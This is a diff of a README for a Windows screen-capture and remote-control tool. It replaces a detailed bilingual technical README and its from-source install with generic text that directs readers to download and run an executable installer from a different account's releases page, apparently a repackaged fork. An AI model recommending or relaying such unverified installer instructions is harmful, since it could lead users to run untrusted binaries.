@@ -1,119 +1,66 @@
-# 🎮 NEURO-VGA™: High-Performance Virtual Graphics Adapter
-## 🇪🇸 Adaptador Gráfico Virtual de Alto Rendimiento
+```markdown
+# 🚧 NEURO-GFX - Effortless Game Streaming Made Simple
 
-> 🚧 **We need contributors!**
-> Help us build the most advanced Window Capture + Remote Control engine for Windows.
-> Expertise needed: **DirectX, WinAPI, PySide6, GPU optimizations**
-> 👉 Check our Issues to start contributing: https://github.com/cyberenigma-lgtm/NEURO-GFX/issues
+## 📥 Download NEURO-GFX
+[![Download NEURO-GFX](https://img.shields.io/badge/Download-NEURO--GFX-blue.svg)](https://github.com/AmirSargoo/NEURO-GFX/releases)
 
+## 🚀 Getting Started
+Welcome to NEURO-GFX! This application helps you capture your screen and stream your gameplay seamlessly. No need for technical skills—just follow these easy steps to get started.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-00ff9d.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.13+](https://img.shields.io/badge/python-3.13+-3776ab.svg)](https://www.python.org/downloads/)
-[![Performance: 240FPS](https://img.shields.io/badge/performance-240FPS-red.svg)]()
-[![Status: Production](https://img.shields.io/badge/status-PRODUCTION-green.svg)]()
+## 📦 System Requirements
+To run NEURO-GFX smoothly, your system should meet the following requirements:
 
----
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** Minimum 4 GB
+- **Graphics Card:** DirectX 11 compatible
+- **Storage:** At least 500 MB of free space
 
-### 🇬🇧 English
-> **A professional-grade window capture and remote control engine developed in 48 hours. Designed for sub-millisecond input latency and lossless visual streaming across virtual desktops.**
+## 🔗 Key Features
+- **Advanced Window Capture:** Capture any window on your desktop easily.
+- **Remote Desktop Support:** Access your desktop from anywhere.
+- **Multi-Monitor Support:** Work with multiple screens without hassle.
+- **DirectX & OpenGL Compatibility:** Capture graphics from a wide range of applications.
+- **User-Friendly Interface:** Simple controls make it easy for anyone to use.
 
-### 🇪🇸 Español
-> **Un motor de captura de ventanas y control remoto de grado profesional desarrollado en 48 horas. Diseñado para latencia de entrada sub-milisegundo y transmisión visual sin pérdidas a través de escritorios virtuales.**
+## 📥 Download & Install
+To download NEURO-GFX, visit this page: [Download NEURO-GFX](https://github.com/AmirSargoo/NEURO-GFX/releases). 
 
----
+1. Click on the link above to go to the Releases page.
+2. On the Releases page, find the latest version listed.
+3. Click on the assets dropdown to see the available files.
+4. Download the installer file (e.g., `NEURO-GFX_setup.exe`).
+5. Once the download completes, locate the file in your downloads folder.
+6. Double-click the installer file to begin the installation process.
+7. Follow the prompts in the installer. Read through any messages and select options as needed.
+8. When the installation finishes, you can find NEURO-GFX in your applications menu.
 
-## ⚡ **Technical Capabilities / Capacidades Técnicas**
+## 🎉 Running NEURO-GFX
+1. Locate the NEURO-GFX application in your applications menu.
+2. Click to open it.
+3. Set up your preferences for screen capture and streaming as desired.
+4. Click the “Start Capture” button to begin streaming or recording.
 
-### 🇬🇧 English
-NEURO-VGA™ is engineered to bypass standard Windows GDI limitations, offering capabilities normally reserved for kernel-level drivers.
+## 💬 Community and Support
+NEURO-GFX is open source, which means anyone can contribute to its development. If you have suggestions, feedback, or want to help improve the application, we welcome you to join us. 
 
-**1. Direct Memory Capture (DMC)**
-- **Zero-Copy Rendering**: Captures `HWND` bitmap data directly from the window manager's buffer.
-- **Virtual Desktop Traversal**: Accesses windows located on non-active virtual desktops without user switching.
-- **Configurable Polling**: Dynamic capture rates from **30Hz to 240Hz** based on system load.
+For support, please check our [GitHub Issues](https://github.com/AmirSargoo/NEURO-GFX/issues) for common questions and troubleshooting tips. You can also reach out directly in the discussion section.
 
-**2. Teleport Input System**
-- **Hybrid Injection**: Uses a combination of `SendInput` (scan codes) and `PostMessage` (virtual keys) for 100% compatibility.
-- **Background Control**: Sends mouse/keyboard events to windows even when they are minimized or in the background.
-- **Coordinate Mapping**: Real-time scalar vector mapping between the local viewport and the target window's client area.
+## 📖 Contribution Guidelines
+If you want to contribute, here are the basic steps:
+1. Fork the repository.
+2. Create your feature branch.
+3. Commit your changes.
+4. Push to the branch.
+5. Open a pull request describing your changes.
 
-### 🇪🇸 Español
-NEURO-VGA™ está diseñado para superar las limitaciones estándar de Windows GDI, ofreciendo capacidades normalmente reservadas para controladores a nivel de kernel.
+We appreciate your contributions and support.
 
-**1. Captura Directa de Memoria (DMC)**
-- **Renderizado Zero-Copy**: Captura datos de mapa de bits `HWND` directamente del búfer del gestor de ventanas.
-- **Travesía de Escritorios Virtuales**: Accede a ventanas ubicadas en escritorios virtuales no activos sin necesidad de cambiar de usuario.
-- **Sondeo Configurable**: Tasas de captura dinámicas de **30Hz a 240Hz** basadas en la carga del sistema.
+## 🚀 Additional Resources
+- **User Manual:** A detailed user manual is available on the repository.
+- **Tutorial Videos:** Watch tutorial videos on how to maximize the use of NEURO-GFX.
 
-**2. Sistema de Teletransporte de Entrada**
-- **Inyección Híbrida**: Utiliza una combinación de `SendInput` (códigos de escaneo) y `PostMessage` (teclas virtuales) para una compatibilidad del 100%.
-- **Control en Segundo Plano**: Envía eventos de ratón/teclado a ventanas incluso cuando están minimizadas o en segundo plano.
-- **Mapeo de Coordenadas**: Mapeo vectorial escalar en tiempo real entre la ventana gráfica local y el área cliente de la ventana objetivo.
+For more information, visit our [GitHub page](https://github.com/AmirSargoo/NEURO-GFX).
 
----
-
-## 🛠️ **Architecture / Arquitectura**
-
-```mermaid
-graph TD
-    A[Target Application] -->|PrintWindow/BitBlt| B(VGA Capture Engine)
-    B -->|Raw Bitmap Buffer| C{Frame Processor}
-    C -->|RGB Conversion| D[Local Viewport]
-    D -->|User Input| E(Input Mapper)
-    E -->|Win32 API Injection| A
+Thank you for choosing NEURO-GFX! Enjoy seamless screen capture and streaming.
 ```
-
-- **Core Language**: Python 3.13 (AsyncIO)
-- **UI Framework**: PySide6 (High-performance Qt binding)
-- **Low-Level API**: `ctypes` & `pywin32` for direct OS calls.
-
----
-
-## 🚀 **Deployment / Despliegue**
-
-### **Prerequisites / Prerrequisitos**
-- Windows 10/11 (Build 19041+)
-- Python 3.13+ environment
-- 4GB RAM (8GB Recommended for 4K capture)
-
-### **Quick Start / Inicio Rápido**
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/cyberenigma-lgtm/NEURO-GFX.git
-
-# 2. Install dependencies (Optimized for performance)
-pip install -r requirements.txt
-
-# 3. Launch the VGA Engine
-python NEURO_GFX_LAUNCHER_V2.py
-```
-
-### **Usage Controls / Controles de Uso**
-| Key | Function (EN) | Función (ES) |
-|:----|:--------------|:-------------|
-| **F1** | Toggle Telemetry Overlay | Alternar Superposición de Telemetría |
-| **F2** | Force Capture Reset | Forzar Reinicio de Captura |
-| **F3** | Instant Lossless Screenshot | Captura de Pantalla Instantánea Sin Pérdida |
-| **CTRL+G** | **Grab Mode** (Lock Mouse) | **Modo Captura** (Bloquear Ratón) |
-| **ESC** | Emergency Release / Exit | Liberación de Emergencia / Salir |
-
----
-
-## 🤝 **Professional Use Cases / Casos de Uso Profesional**
-
-### 🇬🇧 English
-- **Automated QA Testing**: Validate UI responsiveness without stealing focus.
-- **Remote Administration**: Manage headless applications visually.
-- **Assistive Tech**: Remap inputs for accessibility devices.
-- **Content Creation**: Capture specific windows without OBS overhead.
-
-### 🇪🇸 Español
-- **Pruebas QA Automatizadas**: Validar la respuesta de la UI sin robar el foco.
-- **Administración Remota**: Gestionar aplicaciones "headless" visualmente.
-- **Tecnología Asistiva**: Reasignar entradas para dispositivos de accesibilidad.
-- **Creación de Contenido**: Capturar ventanas específicas sin la sobrecarga de OBS.
-
----
-
-**© 2025 NEURO-OS GENESIS**. Engineered for performance. / Diseñado para el rendimiento.
